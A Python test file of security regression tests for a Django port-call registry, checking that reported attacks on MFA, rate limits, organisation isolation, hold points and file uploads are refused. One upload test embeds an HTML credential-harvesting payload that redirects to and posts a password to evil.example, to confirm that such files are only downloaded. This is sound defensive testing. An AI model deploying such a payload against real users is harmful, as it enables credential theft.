"""Regression tests for the independent security review: each test reproduces a reported attack and checks that
the platform now refuses it, while the legitimate path keeps working."""
from __future__ import annotations

import json

import pyotp
import pytest
from django.core import mail
from rest_framework.authtoken.models import Token

from apps.core import mfa
from apps.registry.models import AuditEntry, RequestStatus
from apps.registry.services import calls as call_svc
from apps.registry.services import requests as req_svc

from .conftest import act, force_done, make_call


def declared_call(world, **kw):
    call = make_call(world, **kw)
    force_done(call, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(call, act(world, call, "AGE"))
    call.refresh_from_db()
    return call


def enrol(user) -> str:
    secret = mfa.new_secret()
    user.set_mfa_secret(secret)
    user.mfa_enabled = True
    user.save()
    return secret


# --------------------------------------------------------------------------------------------- second factor
@pytest.mark.django_db
def test_password_alone_cannot_replace_the_second_factor(client, world):
    """Review finding 1: an enrolled authenticator can only be replaced with a code from it."""
    call = declared_call(world)
    request = req_svc.create_request(call, act(world, call, "AGE"), "GAS_FREEING", {"method": "steam"})
    cap = world.users["CAP"]
    original = enrol(cap)
    assert client.login(email=cap.email, password="pw-test-123456")  # password step only

    page = client.get("/compte/mfa/activer/")
    assert page.status_code == 200 and b'name="current_code"' in page.content
    attacker_secret = client.session["mfa_pending_secret"]
    client.post("/compte/mfa/activer/", {"code": pyotp.TOTP(attacker_secret).now()})
    cap.refresh_from_db()
    assert cap.get_mfa_secret() == original
    response = client.post(f"/escales/{call.pk}/action/request_decide/",
                           {"request_id": request.pk, "decision": "APPROVED", "back": "?tab=demandes"})
    assert response.status_code == 302 and "/compte/mfa/" in response["Location"]
    request.refresh_from_db()
    assert request.status != RequestStatus.APPROVED

    # the owner of the phone replaces it legitimately: traced and notified by e-mail
    new_secret = client.session["mfa_pending_secret"]
    client.post("/compte/mfa/activer/", {"current_code": pyotp.TOTP(original).now(),
                                         "code": pyotp.TOTP(new_secret).now()})
    cap.refresh_from_db()
    assert cap.get_mfa_secret() == new_secret
    assert AuditEntry.objects.filter(action="mfa.changed", user=cap).exists()
    assert mail.outbox and cap.email in mail.outbox[-1].to


@pytest.mark.django_db
def test_bearer_token_never_borrows_a_session_step_up(client, world):
    """Review finding 6: a token is strong only with its owner's own X-MFA-Code."""
    call = declared_call(world)
    request = req_svc.create_request(call, act(world, call, "AGE"), "GAS_FREEING", {"method": "steam"})
    cap = world.users["CAP"]
    cap_secret = enrol(cap)
    token = Token.objects.create(user=cap).key
    path = f"/api/v1/calls/{call.reference}/requests/{request.pk}/decide/"
    body = json.dumps({"decision": "APPROVED"})
    # another account's browser session, freshly verified, is present on the same client
    ter = world.users["TER"]
    enrol(ter)
    client.force_login(ter)
    session = client.session
    session.update(mfa.stamp(ter))
    session.save()
    response = client.post(path, data=body, content_type="application/json", HTTP_AUTHORIZATION=f"Bearer {token}")
    assert response.status_code == 403 and response.json()["code"] == "strong_auth_required"
    response = client.post(path, data=body, content_type="application/json", HTTP_AUTHORIZATION=f"Bearer {token}",
                           HTTP_X_MFA_CODE=pyotp.TOTP(cap_secret).now())
    assert response.status_code == 200, response.content
    request.refresh_from_db()
    assert request.status == RequestStatus.APPROVED and request.decision_user == cap


@pytest.mark.django_db
def test_session_stamp_belongs_to_the_person_who_passed_it(client, world):
    apo = world.users["APO"]
    enrol(apo)
    client.force_login(apo)
    session = client.session
    session.update(mfa.stamp(world.users["CAP"]))  # a stamp that is not this person's
    session.save()
    response = client.get("/escales/")
    assert response.status_code == 302 and "/compte/mfa/verifier/" in response["Location"]


@pytest.mark.django_db
def test_attempt_limits_on_guessable_secrets(client, world):
    """Review finding 12: TOTP codes, passwords and master access codes cannot be guessed by repetition."""
    cap = world.users["CAP"]
    secret = enrol(cap)
    client.force_login(cap)
    wrong = "000000" if pyotp.TOTP(secret).now() != "000000" else "111111"
    for _ in range(5):
        client.post("/compte/mfa/verifier/", {"code": wrong, "next": "/escales/"})
    response = client.post("/compte/mfa/verifier/", {"code": pyotp.TOTP(secret).now(), "next": "/escales/"})
    assert response.status_code == 429  # even the right code waits for the end of the window
    client.logout()

    ter = world.users["TER"]
    for _ in range(10):
        assert client.post("/compte/connexion/", {"username": ter.email, "password": "wrong"}).status_code == 200
    response = client.post("/compte/connexion/", {"username": ter.email, "password": "pw-test-123456"})
    assert response.status_code == 429 and "_auth_user_id" not in client.session
    # the person, from another address, is not locked out by someone guessing from one address
    response = client.post("/compte/connexion/", {"username": ter.email, "password": "pw-test-123456"},
                           REMOTE_ADDR="10.20.30.40")
    assert response.status_code == 302 and "_auth_user_id" in client.session
    client.logout()

    call = declared_call(world)
    _link, _token, code = call_svc.issue_master_link(call, act(world, call, "AGE"), master_name="Capt. Limit")
    for _ in range(10):
        client.post("/bord/", {"code": "AAAAAAAA"})
    response = client.post("/bord/", {"code": code})
    assert response.status_code == 429


@pytest.mark.django_db
def test_administrator_reset_of_the_second_factor_is_traced(client, world):
    from apps.core.models import User

    sur = world.users["SUR"]
    enrol(sur)
    admin = User.objects.create_user(email="dir-admin@test.local", password="pw-test-123456", full_name="Port Admin",
                                     organization=world.orgs.authority, roles=["DIR"], is_port_admin=True)
    enrol(admin)
    client.force_login(admin)
    session = client.session
    session.update(mfa.stamp(admin))
    session.save()
    form = client.get(f"/admin/core/user/{sur.pk}/change/")
    assert form.status_code == 200
    data = {"email": sur.email, "full_name": sur.full_name, "organization": sur.organization_id, "roles": ["SUR"],
            "language": sur.language or "fr", "phone": "", "is_active": "on", "notify_digest_only": "on"}
    response = client.post(f"/admin/core/user/{sur.pk}/change/", data)
    assert response.status_code == 302, response.content[:2000]
    sur.refresh_from_db()
    assert not sur.mfa_enabled and not sur.mfa_secret_encrypted
    assert AuditEntry.objects.filter(action="user.administered", user=admin, object_id=sur.pk).exists()


# ------------------------------------------------------------------------------------------------- hold points
def task(call, code):
    template_code, number = code.split(":")
    return call.tasks.get(template_code=template_code, number=number)


def now(minutes=0):
    from datetime import timedelta

    from django.utils import timezone

    return timezone.now() + timedelta(minutes=minutes)


@pytest.mark.django_db
def test_requester_cannot_wave_aside_the_decision_it_awaits(world):
    """Review finding 2: "not applicable" on a decision belongs to the deciding role, with its second factor."""
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services import tasks as task_svc
    from apps.registry.services.errors import HoldPointRefused, PermissionRefused, StrongAuthRequired

    call = declared_call(world)
    age = act(world, call, "AGE")
    for code in ("M0:34", "M0:25", "M0:21", "M0:22", "M0:31"):
        with pytest.raises(PermissionRefused):
            task_svc.mark_not_applicable(task(call, code), age, "not needed")
    with pytest.raises(HoldPointRefused):
        ms_svc.record_milestone(call, act(world, call, "SVC"), "PILOT_ON_BOARD_ARR", now(-1))
    with pytest.raises(StrongAuthRequired):
        task_svc.mark_not_applicable(task(call, "M0:25"), act(world, call, "CAP", strong=False), "anchored on arrival")
    task_svc.mark_not_applicable(task(call, "M0:25"), act(world, call, "CAP"), "no movement: stays at the roads")
    assert task(call, "M0:25").completed_role == "CAP"


@pytest.mark.django_db
def test_answered_dispute_still_locks_bill_of_lading_and_closure(world):
    """Review finding 3: an answer settles nothing — only a closure does."""
    from django.core.files.base import ContentFile

    from apps.registry.models import CallStatus, PortCall
    from apps.registry.services import disputes
    from apps.registry.services import documents as doc_svc
    from apps.registry.services.errors import HoldPointRefused, LockRefused

    from .conftest import master

    call = declared_call(world, operations=("M2",))
    nav, ter, age, cap = master(world, call), act(world, call, "TER"), act(world, call, "AGE"), act(world, call, "CAP")
    quantity = disputes.open_dispute(call, nav, target_kind="MEASUREMENT", target_id=None, subject="Final quantity",
                                     statement="Ship 29 950 t, shore 29 100 t", counterpart_role="TER")
    doc_svc.upload_document(call, act(world, call, "COM"), "DOC_INSTRUCTIONS", ContentFile(b"%PDF i", name="i.pdf"),
                            task=task(call, "M2:2.16"))
    doc_svc.upload_document(call, act(world, call, "INS"), "QQ_CERT", ContentFile(b"%PDF q", name="q.pdf"),
                            task=task(call, "M2:2.15"))
    disputes.respond(quantity, ter, "We maintain the shore figure.")
    with pytest.raises(LockRefused):
        doc_svc.upload_document(call, age, "BILL_OF_LADING", ContentFile(b"%PDF bl", name="bl.pdf"))
    disputes.close(quantity, nav, agreed=True, text="Agreed on the shore figure after re-gauging.")
    doc_svc.upload_document(call, age, "BILL_OF_LADING", ContentFile(b"%PDF bl", name="bl.pdf"))

    PortCall.objects.filter(pk=call.pk).update(status=CallStatus.DEPARTED)  # setup shortcut
    call.refresh_from_db()
    force_done(call, ["M0:36"])
    call_svc.confirm_closure(call, age)
    other = disputes.open_dispute(call, act(world, call, "COM"), target_kind="OTHER", target_id=None,
                                  subject="Demurrage times", statement="NOR time contested", counterpart_role="TER")
    disputes.respond(other, ter, "Disagree.")
    with pytest.raises(HoldPointRefused):
        call_svc.close_call(call, cap)
    disputes.close(other, cap, agreed=False, text="No agreement reached; recorded by the harbour master.")
    call_svc.close_call(call, cap)


@pytest.mark.django_db
def test_upload_completes_only_the_task_expecting_that_document(world):
    """Review finding 4: a file attached to a task never stands for a milestone, a decision or another document."""
    from django.core.files.base import ContentFile

    from apps.registry.models import TaskStatus
    from apps.registry.services import documents as doc_svc
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.errors import HoldPointRefused, PermissionRefused, RuleViolation

    call = declared_call(world)
    force_done(call, ["M0:27", "M0:28", "M0:31", "M1:1.04", "M1:1.05", "M1:1.06", "M1:1.07"])
    ter = act(world, call, "TER")
    with pytest.raises(RuleViolation):
        doc_svc.upload_document(call, ter, "PHOTO", ContentFile(b"\x89PNG fake", name="x.png"), task=task(call, "M0:29"))
    assert task(call, "M0:29").status == TaskStatus.PENDING
    with pytest.raises(HoldPointRefused):
        ms_svc.record_milestone(call, ter, "TRANSFER_START", now(-1))
    with pytest.raises(PermissionRefused):  # the task never widens the issuers of a document type
        doc_svc.upload_document(call, ter, "QQ_CERT", ContentFile(b"%PDF", name="c.pdf"), task=task(call, "M1:1.16"))
    with pytest.raises((RuleViolation, PermissionRefused)):
        doc_svc.upload_document(call, act(world, call, "CAP", strong=False), "OTHER", ContentFile(b"%PDF", name="o.pdf"),
                                task=task(call, "M0:34"))
    assert task(call, "M0:34").status == TaskStatus.PENDING
    # the legitimate path: the document the task expects, by its role
    doc_svc.upload_document(call, act(world, call, "INS"), "QQ_CERT", ContentFile(b"%PDF", name="q.pdf"),
                            task=task(call, "M1:1.16"))
    assert task(call, "M1:1.16").status == TaskStatus.DONE


@pytest.mark.django_db
def test_hold_points_require_an_authorization_in_force(world):
    """Review finding 5: an expired clearance opens nothing; berthing and departure are guarded on their own."""
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.errors import HoldPointRefused

    from .conftest import grant_authorization, master

    call = declared_call(world)
    svc, nav = act(world, call, "SVC"), master(world, call)
    for code in ("ALL_FAST", "FIRST_LINE"):
        with pytest.raises(HoldPointRefused):
            ms_svc.record_milestone(call, svc, code, now(-20))
    with pytest.raises(HoldPointRefused):
        ms_svc.record_milestone(call, nav, "DEPARTED", now(-5))
    call.refresh_from_db()
    assert call.atb is None and call.atd is None

    # a departure clearance that expired two hours ago
    force_done(call, ["M0:32", "M0:33"])
    clearance = task(call, "M0:34")
    from apps.registry.services.tasks import system_complete

    from .conftest import sys as system_actor_for

    system_complete(clearance, system_actor_for(call), evidence="test")
    grant_authorization(call, clearance, valid_from=now(-26 * 60), valid_until=now(-120))
    with pytest.raises(HoldPointRefused) as refusal:
        ms_svc.record_milestone(call, svc, "PILOT_ON_BOARD_DEP", now(-1))
    assert "M0:34" in refusal.value.message
    # entered afterwards, a departure that took place while the clearance was in force is accepted
    ms_svc.record_milestone(call, svc, "PILOT_ON_BOARD_DEP", now(-180))


# ------------------------------------------------------------------------------------- organisations and closure
@pytest.mark.django_db
def test_rival_agency_neither_sees_nor_links_another_agencys_call(client, world):
    """Review finding 7."""
    from apps.core.models import Organization, User
    from apps.registry.models import JournalEntry

    victim = make_call(world)
    rival_org = Organization.objects.create(port=world.port, name="Rival Agency", allowed_roles=["AGE"])
    rival = User.objects.create_user(email="rival@test.local", password="pw-test-123456", full_name="Rival",
                                     organization=rival_org, roles=["AGE"])
    client.force_login(rival)
    page = client.get("/escales/nouvelle/").content.decode()
    assert victim.reference not in page
    own = call_svc.create_call(rival, vessel=world.vessel, eta=now(60 * 24 * 9), requested_berth_kind="JETTY",
                               operations=["M1"])
    for partner in (victim.reference, str(victim.pk)):
        response = client.post(f"/escales/{own.pk}/action/link/", {"partner": partner, "link_kind": "STS"})
        assert response.status_code == 404
    victim.refresh_from_db()
    own.refresh_from_db()
    assert victim.linked_call_id is None and own.linked_call_id is None
    assert not JournalEntry.objects.filter(action="call.linked").exists()
    with pytest.raises(Exception):
        call_svc.create_call(rival, vessel=world.vessel, eta=now(60 * 24 * 9), requested_berth_kind="JETTY",
                             operations=["M1"], linked_call=victim, link_kind="STS")
    # the agency links its own calls, and the link is written on both
    mine = make_call(world)
    call_svc.link_partner(mine, act(world, mine, "AGE"), victim, "STS")
    assert JournalEntry.objects.filter(action="call.linked", call=victim).exists()
    assert JournalEntry.objects.filter(action="call.linked", call=mine).exists()


@pytest.mark.django_db
def test_two_providers_on_one_call_stay_apart(world):
    """Review finding 8: the role alone never lets one organisation read, replace or cancel what another issued."""
    from django.core.files.base import ContentFile

    from apps.core.models import User
    from apps.registry.services import documents as doc_svc
    from apps.registry.services import requests as req_svc
    from apps.registry.services import rights
    from apps.registry.services.context import actor_for_call
    from apps.registry.services.errors import PermissionRefused, RuleViolation

    call = declared_call(world)
    call_svc.add_party(call, act(world, call, "AGE"), world.orgs.sts, "PRE")
    sts_user = User.objects.create_user(email="sts@test.local", password="pw-test-123456", full_name="STS",
                                        organization=world.orgs.sts, roles=["PRE"])
    sts, waste = actor_for_call(call, user=sts_user), act(world, call, "PRE")
    note = doc_svc.upload_document(call, waste, "BUNKER_DELIVERY_NOTE", ContentFile(b"%PDF bdn", name="bdn.pdf"),
                                   counterpart_role="NAV")
    assert rights.document_visible(waste, note) and not rights.document_visible(sts, note)
    receipt = doc_svc.upload_document(call, waste, "WASTE_RECEIPT", ContentFile(b"%PDF r", name="r.pdf"))
    with pytest.raises(PermissionRefused):
        doc_svc.upload_document(call, sts, "WASTE_RECEIPT", ContentFile(b"%PDF fake", name="r2.pdf"), previous=receipt)
    with pytest.raises(PermissionRefused):
        doc_svc.cancel_document(receipt, sts, "void")

    # a service order names its provider when several organisations hold the role
    with pytest.raises(RuleViolation):
        req_svc.create_request(call, act(world, call, "AGE"), "WASTE_COLLECTION", {"categories": "I, V", "volume_m3": 12})
    order = req_svc.create_request(call, act(world, call, "AGE"), "WASTE_COLLECTION",
                                   {"categories": "I, V", "volume_m3": 12}, provider=world.orgs.waste.pk)
    assert rights.request_visible(waste, order) and not rights.request_visible(sts, order)
    with pytest.raises(PermissionRefused):
        req_svc.execute_request(order, sts)
    req_svc.execute_request(order, waste)


@pytest.mark.django_db
def test_only_the_opening_organisation_settles_its_dispute(world):
    from apps.core.models import Organization, User
    from apps.registry.services import disputes
    from apps.registry.services.context import actor_for_call
    from apps.registry.services.errors import PermissionRefused

    call = declared_call(world)
    charterer = Organization.objects.create(port=world.port, name="Charterer", allowed_roles=["COM"])
    call_svc.add_party(call, act(world, call, "AGE"), charterer, "COM")
    user = User.objects.create_user(email="charterer@test.local", password="pw-test-123456", full_name="Charterer",
                                    organization=charterer, roles=["COM"])
    owner = act(world, call, "COM")
    dispute = disputes.open_dispute(call, owner, target_kind="OTHER", target_id=None, subject="Laytime",
                                    statement="NOR time contested", counterpart_role="TER")
    with pytest.raises(PermissionRefused):
        disputes.close(dispute, actor_for_call(call, user=user), agreed=True, text="settled")
    disputes.close(dispute, owner, agreed=True, text="Settled with the terminal.")


@pytest.mark.django_db
def test_closed_call_is_frozen(world):
    """Review finding 9: after closure, nothing is cancelled, signed or waved aside any more."""
    from apps.registry.models import CallStatus, PortCall, TaskStatus
    from apps.registry.services import documents as doc_svc
    from apps.registry.services import reports
    from apps.registry.services import tasks as task_svc
    from apps.registry.services.errors import RuleViolation

    from .conftest import master

    call = declared_call(world)
    age, cap, ter, nav = act(world, call, "AGE"), act(world, call, "CAP"), act(world, call, "TER"), master(world, call)
    PortCall.objects.filter(pk=call.pk).update(status=CallStatus.DEPARTED)  # setup shortcut
    call.refresh_from_db()
    sof = reports.issue_statement_of_facts(call, age)
    doc_svc.sign_document(sof, nav)
    doc_svc.sign_document(sof, ter)
    call_svc.confirm_closure(call, age)
    call_svc.close_call(call, cap)
    call.refresh_from_db()
    with pytest.raises(RuleViolation):
        doc_svc.cancel_document(sof, age, "withdrawn")
    pending = call.tasks.filter(status=TaskStatus.PENDING, not_applicable_allowed=True).first()
    with pytest.raises(RuleViolation):
        task_svc.mark_not_applicable(pending, age, "after the fact")


@pytest.mark.django_db
def test_listing_drafts_and_credited_roles(world):
    """Minor findings: an expired role no longer lists the call; a draft is announced to nobody but its agency;
    a task done by another party's act credits the role that acted."""
    from apps.core.models import User
    from apps.registry.models import JournalEntry, Notification
    from apps.registry.services import requests as req_svc
    from apps.registry.services import rights

    call = declared_call(world)
    call_svc.add_party(call, act(world, call, "CAP"), world.orgs.sts, "PRE", valid_until=now(-5))
    sts_user = User.objects.create_user(email="sts3@test.local", password="pw-test-123456", full_name="STS three",
                                        organization=world.orgs.sts, roles=["PRE"])
    assert call not in list(rights.call_queryset_for_user(sts_user))

    draft = make_call(world)
    req_svc.create_request(draft, act(world, draft, "AGE"), "BERTH", {"window_from": now(60).isoformat(),
                                                                      "arrival_draft": 11})
    assert not Notification.objects.filter(user=world.users["APO"], call=draft).exists()
    force_done(draft, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(draft, act(world, draft, "AGE"))
    assert Notification.objects.filter(user=world.users["APO"], call=draft, title_en__contains="to review").exists()

    partner = make_call(world)
    linked = make_call(world, modules=("M9",), linked_call=partner, link_kind="OUTER")
    force_done(linked, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(linked, act(world, linked, "AGE"))
    req_svc.create_request(linked, act(world, linked, "TER"), "DOUBLE_BANKING",
                           {"purpose": "lightering", "duration_h": 12, "inner_vessel": "MT INNER"})
    done = task(linked, "M9:9.01")
    assert done.completed_role == "TER"
    entry = JournalEntry.objects.get(call=linked, action="task.completed", object_id=done.pk)
    assert entry.actor_role == "TER"


# ---------------------------------------------------------------------------------------- documents and audit
@pytest.mark.django_db
def test_a_file_sent_by_a_party_is_never_rendered_as_a_page_of_the_site(client, world):
    """Review finding 10: file types are recognised from their content; uploaded HTML is only ever downloaded."""
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.registry.services import documents as doc_svc

    call = declared_call(world)
    ter = act(world, call, "TER")
    page = (b'<meta http-equiv="refresh" content="0;url=https://evil.example/">'
            b'<form action="https://evil.example/collect" method="post"><input name="password" type="password"></form>')
    html = doc_svc.upload_document(call, ter, "OTHER", SimpleUploadedFile("notice.html", page, content_type="text/html"),
                                   confidentiality="N1")
    disguised = doc_svc.upload_document(call, ter, "OTHER", SimpleUploadedFile("p.png", page, content_type="image/png"),
                                        confidentiality="N1")
    pdf = doc_svc.upload_document(call, ter, "OTHER",
                                  SimpleUploadedFile("n.pdf", b"%PDF-1.4\n%test", content_type="text/html"),
                                  confidentiality="N1")
    assert disguised.mime_type == "application/octet-stream" and pdf.mime_type == "application/pdf"
    client.force_login(world.users["INS"])
    for doc in (html, disguised):
        response = client.get(f"/escales/{call.pk}/documents/{doc.pk}/?inline=1")
        assert response.status_code == 200 and response["Content-Disposition"].startswith("attachment")
        assert response["Content-Type"] == "application/octet-stream"
        assert "sandbox" in response["Content-Security-Policy"]
    response = client.get(f"/escales/{call.pk}/documents/{pdf.pk}/?inline=1")
    assert response["Content-Type"] == "application/pdf" and response["Content-Disposition"].startswith("inline")


@pytest.mark.django_db
def test_api_consultations_are_audited(client, world):
    """Review finding 11: reading a call's records through the API leaves the same trace as on screen."""
    from apps.registry.models import AuditEntry
    from apps.registry.services import correspondence

    call = declared_call(world)
    correspondence.create_thread(call, act(world, call, "AGE"), subject="Port account", participant_roles=["COM"],
                                 body="Disbursement 41 500 USD", confidentiality="N3")
    token = Token.objects.create(user=world.users["COM"]).key
    paths = ("threads/", "disputes/", "journal/", "documents/", "requests/", "measurements/", "field-bundle/",
             "tasks/", "milestones/")
    before = AuditEntry.objects.count()
    for path in paths:
        assert client.get(f"/api/v1/calls/{call.reference}/{path}", HTTP_AUTHORIZATION=f"Bearer {token}").status_code == 200
    entries = AuditEntry.objects.filter(pk__gt=0).order_by("-seq")[: len(paths)]
    assert AuditEntry.objects.count() == before + len(paths)
    assert {e.object_kind for e in entries} == {p.rstrip("/") for p in paths}
    assert all(e.user == world.users["COM"] and e.detail == "api" for e in entries)


# =============================================================================================== second review
def second_org(world, call, name, role, email):
    from apps.core.models import Organization, User
    from apps.registry.services.context import actor_for_call

    org = Organization.objects.create(port=world.port, name=name, allowed_roles=[role])
    inviter = act(world, call, "AGE") if role in call_svc.AGENCY_INVITABLE_ROLES else act(world, call, "CAP")
    call_svc.add_party(call, inviter, org, role)
    user = User.objects.create_user(email=email, password="pw-test-123456", full_name=name, organization=org,
                                    roles=[role])
    return actor_for_call(call, user=user, strong_auth=True)


@pytest.mark.django_db
def test_only_the_assigned_role_waives_a_guarded_task(world):
    """A co-role or one signatory of a joint task never waives what a hold point waits for."""
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services import tasks as task_svc
    from apps.registry.services.errors import HoldPointRefused, PermissionRefused

    from .conftest import master

    call = declared_call(world)
    force_done(call, ["M0:28", "M0:29", "M0:31", "M1:1.04", "M1:1.06", "M1:1.07"])
    ter, nav = act(world, call, "TER"), master(world, call)
    with pytest.raises(PermissionRefused):
        task_svc.mark_not_applicable(task(call, "M1:1.05"), ter, "no gauging needed")  # INS task, TER co-role
    with pytest.raises(PermissionRefused):
        task_svc.mark_not_applicable(task(call, "M0:27"), nav, "meeting not needed")  # joint task, master alone
    with pytest.raises(HoldPointRefused):
        ms_svc.record_milestone(call, ter, "TRANSFER_START", now(-1))

    buoy = declared_call(world, kind="SPM")
    force_done(buoy, ["M0:25"])
    with pytest.raises(PermissionRefused):
        task_svc.mark_not_applicable(task(buoy, "MA2:A2.02"), act(world, buoy, "TER"), "swell fine")
    with pytest.raises(HoldPointRefused):
        ms_svc.record_milestone(buoy, act(world, buoy, "SVC"), "ALL_FAST", now(-5))


@pytest.mark.django_db
def test_administrators_hold_a_second_factor(client, world):
    """A port administrator's password alone opens neither the settings nor anyone else's account."""
    from django.core import mail

    admin = world.users["DIR"]
    admin.is_port_admin = True
    admin.save()
    cap = world.users["CAP"]
    enrol(cap)
    assert client.login(email=admin.email, password="pw-test-123456")  # password only
    response = client.get(f"/admin/core/user/{cap.pk}/change/")
    assert response.status_code == 302 and "/compte/mfa/" in response["Location"]
    response = client.post(f"/admin/core/user/{cap.pk}/password/", {"password1": "Taken-over-2026!",
                                                                     "password2": "Taken-over-2026!"})
    assert response.status_code == 302 and "/compte/mfa/" in response["Location"]
    cap.refresh_from_db()
    assert cap.check_password("pw-test-123456") and cap.mfa_enabled
    # with its second factor, the administrator may reset another person's — who is told by e-mail
    enrol(admin)
    session = client.session
    session.update(mfa.stamp(admin))
    session.save()
    mail.outbox.clear()
    response = client.post(f"/admin/core/user/{cap.pk}/change/", {
        "email": cap.email, "full_name": cap.full_name, "organization": cap.organization_id, "roles": ["CAP"],
        "language": "en", "phone": "", "is_active": "on", "notify_digest_only": "on"})
    assert response.status_code == 302
    assert any(cap.email in m.to for m in mail.outbox)
    # the settings screens have no separate, unthrottled sign-in page
    client.logout()
    response = client.get("/admin/login/?next=/admin/core/user/")
    assert response.status_code == 302 and response["Location"].startswith("/compte/connexion/")


@pytest.mark.django_db
def test_rectifications_and_late_entries(world):
    """A rectification is the emitter's own, judged at its corrected time; a late entry is marked as such."""
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.errors import HoldPointRefused, PermissionRefused
    from apps.registry.services.tasks import system_complete

    from .conftest import grant_authorization, master
    from .conftest import sys as system_actor_for

    call = declared_call(world)
    force_done(call, ["M0:25"])  # in force from yesterday
    svc_a = act(world, call, "SVC")
    svc_b = second_org(world, call, "Mooring Co", "SVC", "moor@test.local")
    first = ms_svc.record_milestone(call, svc_a, "ALL_FAST", now(-30))
    with pytest.raises(PermissionRefused):
        ms_svc.record_milestone(call, svc_b, "ALL_FAST", now(-40), rectifies=first, rectification_reason="wrong time")
    with pytest.raises(HoldPointRefused):  # three days ago, no movement authorization was in force
        ms_svc.record_milestone(call, svc_a, "ALL_FAST", now(-3 * 24 * 60), rectifies=first,
                                rectification_reason="wrong time")
    fixed = ms_svc.record_milestone(call, svc_a, "ALL_FAST", now(-40), rectifies=first, rectification_reason="typo")
    assert fixed.is_rectification

    other = declared_call(world)
    clearance = task(other, "M0:34")
    system_complete(clearance, system_actor_for(other), evidence="test")
    grant_authorization(other, clearance, valid_from=now(-26 * 60), valid_until=now(-2 * 60))
    departed = ms_svc.record_milestone(other, master(world, other), "DEPARTED", now(-3 * 60))
    assert departed.deferred  # entered three hours after the declared time: shown as a deferred entry


@pytest.mark.django_db
def test_an_interruption_ends_by_the_party_that_started_it(world):
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.errors import PermissionRefused

    from .conftest import master

    call = declared_call(world)
    ter, nav = act(world, call, "TER"), master(world, call)
    start = ms_svc.record_milestone(call, ter, "INTERRUPTION_START", now(-120), cause_code="SHORE_PUMP")
    with pytest.raises(PermissionRefused):
        ms_svc.record_milestone(call, nav, "INTERRUPTION_END", now(-115), related=start)
    end = ms_svc.record_milestone(call, ter, "INTERRUPTION_END", now(-10), related=start)
    assert end.emitter_role == "TER"


@pytest.mark.django_db
def test_threads_figures_and_journal_stay_with_their_organisation(client, world):
    from django.core.files.base import ContentFile

    from apps.registry.services import correspondence, rights
    from apps.registry.services import documents as doc_svc
    from apps.registry.services import measurements as meas_svc
    from apps.registry.services.errors import PermissionRefused

    from .conftest import master

    call = declared_call(world)
    owner = act(world, call, "COM")
    charterer = second_org(world, call, "Charterer Ltd", "COM", "chart@test.local")
    thread = correspondence.create_thread(call, owner, subject="Hire and port costs", participant_roles=["AGE"],
                                          body="Owner's position on the hire", confidentiality="N3")
    assert rights.thread_visible(owner, thread) and rights.thread_visible(act(world, call, "AGE"), thread)
    assert not rights.thread_visible(charterer, thread)
    with pytest.raises(PermissionRefused):
        correspondence.post_message(thread, charterer, "writing in the owner's thread")

    ter_b = second_org(world, call, "Friendly Depot", "TER", "depot@test.local")
    # two terminals: the agency designates the one that speaks for the shore side
    terminal = call.parties.get(organization=world.orgs.terminal, role="TER")
    call_svc.designate_shore_side(call, act(world, call, "AGE"), terminal)
    m = meas_svc.create_measurement(call, act(world, call, "INS"), "FINAL")
    meas_svc.add_value(m, master(world, call), "SHIP", "30000")
    meas_svc.add_value(m, act(world, call, "TER"), "SHORE", "29000")
    with pytest.raises(PermissionRefused):
        meas_svc.add_value(m, ter_b, "SHORE", "29990")

    sts = second_org(world, call, "STS Two", "PRE", "sts2@test.local")
    doc_svc.upload_document(call, act(world, call, "PRE"), "WASTE_RECEIPT", ContentFile(b"%PDF-1 r", name="r.pdf"),
                            title="Waste receipt, invoice 2 300 USD", confidentiality="N1")
    token = Token.objects.create(user=sts.user).key
    body = json.dumps(client.get(f"/api/v1/calls/{call.reference}/journal/", HTTP_AUTHORIZATION=f"Bearer {token}").json())
    assert "invoice 2 300 USD" not in body


@pytest.mark.django_db
def test_only_the_shore_side_provider_countersigns_at_sea(world):
    import uuid

    from apps.registry.services import milestones as ms_svc
    from apps.registry.services import rights
    from apps.registry.services.errors import PermissionRefused
    from apps.registry.services.sync import process_batch

    from .conftest import master

    call = make_call(world, kind="ANCHORAGE", operations=("M6",),
                     parties=[(world.orgs.waste, "PRE"), (world.orgs.sts, "PRE")])
    force_done(call, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(call, act(world, call, "AGE"))
    stop = ms_svc.record_milestone(call, master(world, call), "INTERRUPTION_START", now(-60), cause_code="WEATHER_LIMITS")
    waste = act(world, call, "PRE")
    assert not rights.milestone_visible(waste, stop)
    result = process_batch(call, waste, [{"kind": "countersign", "client_uuid": str(uuid.uuid4()), "milestone_id": stop.pk}])
    assert result[0]["status"] == "refused"
    with pytest.raises(PermissionRefused):
        ms_svc.countersign_milestone(stop, waste)


@pytest.mark.django_db
def test_frozen_calls_and_named_providers(client, world):
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.registry.models import CallStatus, PortCall
    from apps.registry.services import correspondence, disputes
    from apps.registry.services import documents as doc_svc
    from apps.registry.services import measurements as meas_svc
    from apps.registry.services import requests as req_svc
    from apps.registry.services.errors import RuleViolation

    closed = declared_call(world)
    PortCall.objects.filter(pk=closed.pk).update(status=CallStatus.CLOSED)
    closed.refresh_from_db()
    with pytest.raises(RuleViolation):
        meas_svc.create_measurement(closed, act(world, closed, "INS"), "FINAL")
    with pytest.raises(RuleViolation):
        correspondence.create_thread(closed, act(world, closed, "TER"), subject="after", participant_roles=["AGE"],
                                     body="x")
    cancelled = make_call(world)
    dispute = disputes.open_dispute(cancelled, act(world, cancelled, "AGE"), target_kind="OTHER", target_id=None,
                                    subject="s", statement="t", counterpart_role="TER")
    call_svc.cancel_call(cancelled, act(world, cancelled, "AGE"), "no longer needed")
    with pytest.raises(RuleViolation):  # nothing new on a cancelled call…
        disputes.open_dispute(cancelled, act(world, cancelled, "AGE"), target_kind="OTHER", target_id=None,
                              subject="late", statement="t", counterpart_role="TER")
    # …but a dispute left open at the cancellation can still be answered and closed, instead of staying open for ever
    disputes.respond(dispute, act(world, cancelled, "TER"), "late answer")
    disputes.close(dispute, act(world, cancelled, "AGE"), agreed=True, text="settled after the cancellation")

